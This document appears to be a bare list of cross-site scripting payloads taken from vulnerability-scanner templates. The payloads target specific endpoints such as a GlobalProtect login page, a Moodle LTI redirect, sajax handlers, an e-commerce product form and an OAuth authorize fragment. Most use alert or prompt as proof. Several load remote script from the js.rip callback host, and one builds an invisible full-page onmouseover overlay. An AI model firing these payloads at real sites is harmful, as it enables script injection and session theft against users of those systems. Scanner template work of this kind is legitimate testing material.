+path:  /index.php?Search&AdvancedSearch&bel9c%22onmouseover%3d%22alert(`Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole-Hello-hole`)%22style%3d%22position%3aabsolute%3bwidth%3a100%25%3bheight%3a100%25%3btop%3a0%3bleft%3a0%3b%22zgm9j=1
+payload: "<script>alert(document.domain)</script>"
+response.status == 500 && response.body.bcontains(b"<script>alert(1)")
+rs=emit_debug_note&rsargs[]={{string}}&rsargs[]=<script>alert('document.domain');</script>
+rs=sajax_show_one_stub&rsargs[]={{string}}<script>alert('document.domain');</script>
+script_payload_1: "<script>$.getScript(\"//js.rip/1wqkhxuglq\")</script>"
+script_payload_2: "</script><script%20/src=//js.rip/1wqkhxuglq></script>\"><41707"
+script_payload_3: "<script /src=//js.rip/1wqkhxuglq></script>"
+script_payload_4: "<script src=\"//js.rip/1wqkhxuglq\"></script>"
+script_payload_5: "</script><script src='https://js.rip/1wqkhxuglq'></script>"
+script_payload_6: "<script src=//js.rip/1wqkhxuglq></script>"
+script_payload_7: "\u0022\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e"
+task=UPDATE&Kategori=18&UrunId=12&UrunAdi=</script><script>alert("a1f1r1o1g1t1e1s1t1")</script>&MarkaId=0&MarkaAd=&ModelId=0&ModelAd=&Tedarikci=0&TedarikciKodu=12&StokSayisi=100&StokBirimId=1&StokBirimAd=Adet&EnYeniUrun=0&EnCokSatilan=0&AramaKelimeleri=&HamSatis=200&AlisFiyat=100&HavaleYuzde=0&Birim=0&KDV=18&KdvGoster=false&point_catalog=false&IndirimliUrun=true&AltUrunVar=false&YeniUrun=true&AnaSayfaUrun=true&VitrinUrun=false&Gorunme=true&BayiUrun=false&SiparisNotuGoster=false&En=0&Boy=0&Derinlik=0&Agirlik=0&Desi=1&GarantiBilgisi=&TeslimatBilgisi=&UrunNot=&WsUrunKodu=T12&SeoAyar=3&SeoTitle=&SeoLink=deneme-urun-1&SeoDesc=&SeoKeyw=&Detay=%C3%9Cr%C3%BCn%20ekleme%20konusunda%20detayl%C4%B1%20bilgi%20i%C3%A7in%2C%20videomuzu%20izleyebilirsiniz%3A%C2%A0%0A%3Cdiv%3E%3Ca%20href%3D%22https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DoWlUHvi4IPw%22%3Ehttps%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DoWlUHvi4IPw%3C%2Fa%3E%3C%2Fdiv%3E&AnaKategoriId=18&point=0&subscribe=0&subscribe_frequency=&subscribe_discount_rate=0&UruneKargoUcretsiz=0&UyeUcretsizKargo=0&BayiUcretsizKargo=0&Sayisal1=0
+url: "{{BaseURL}}/listproducts.php?cat=1<%2Fscript><script>alert%283%2B4%29<%2Fscript>"
+url: '{{BaseURL}}/oauth/authorize#%7B%20"redirectUri":%20"zzz",%20"resourceId":%20"fff",%20"resourceName":%20"aa",%20"resourceType":%20"azz",%20"userEmail":%20"aaa@aa.com",%20"userFirstName":%20"zzz",%20"userLastName":%20"zzff",%20"xsrfToken":%20"x","subdomain":"aaa<svg/onload=prompt({{random_int}})>aaaa","accessToken":"ab"%20%7D'
+userName=TEST&x=TEST&action=login&redirectUrl=%22%3E%3Cscript%3Eprompt('XSS')%3C/script%3E
+xss_payload: '"></script><script>alert(document.domain);</script>'
+{"<img onerror=confirm(1337) src/>":1}
+{{.root}}/global-protect/login.esp?user=j%22;-alert(1)-%22x
+{{.root}}/mod/lti/auth.php?redirect_uri=javascript:alert('xss')
+{{.root}}/topic/e'%22%3E%3Cimg%20src=x%20onerror=alert(2)%3E
+{{.root}}/{{.stats}}"-prompt(1)-"
